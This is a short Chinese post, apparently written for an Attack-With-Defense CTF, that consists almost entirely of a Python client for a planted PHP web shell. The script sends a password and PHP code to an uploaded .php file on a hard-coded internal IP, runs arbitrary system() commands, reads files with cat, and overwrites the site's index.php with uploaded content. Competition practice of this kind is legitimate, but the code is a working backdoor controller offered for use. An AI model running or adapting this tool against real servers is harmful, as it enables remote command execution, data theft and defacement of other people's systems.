# awd---后门脚本简单功能

```python
# coding:utf8

import time
import requests
import base64


class BackDoor:
    backdoor_url = ''
    password = ''

    def __init__(self, backdoor_url, password):
        self.backdoor_url = backdoor_url
        self.password = password
    
    def base_code(self, code_str):
        data = {
            'pass': self.password,
            'a': code_str
        }
        res = requests.post(self.backdoor_url, data=data)
        return res.status_code, res.content
    
    def command(self, command_str):
        code_str = "system('{}');".format(command_str)
        return self.base_code(code_str)

    def write_file(self, src_file_path, dst_file_path):
        base64_content = base64.b64encode(open(src_file_path).read())
        code_str = "$file='{}';$fopen=fopen($file,'wb');fputs($fopen,base64_decode('{}'));fclose($fopen);".format(dst_file_path, base64_content)
        return self.base_code(code_str)
    
    def read_file(self, file_path):
        code_str = "system('cat {}');".format(file_path)
        return self.base_code(code_str)
    

backdoor_url = 'http://10.160.40.96:8803/admin/upload/1592293790.php'
password = 'zheshimima'

back_door = BackDoor(
    backdoor_url,
    password
)

src_file_path = 'D:/html/index.php'
dst_file_path = '/var/www/html/index.php'
back_door.write_file(src_file_path, dst_file_path)
```


2020/6/16  
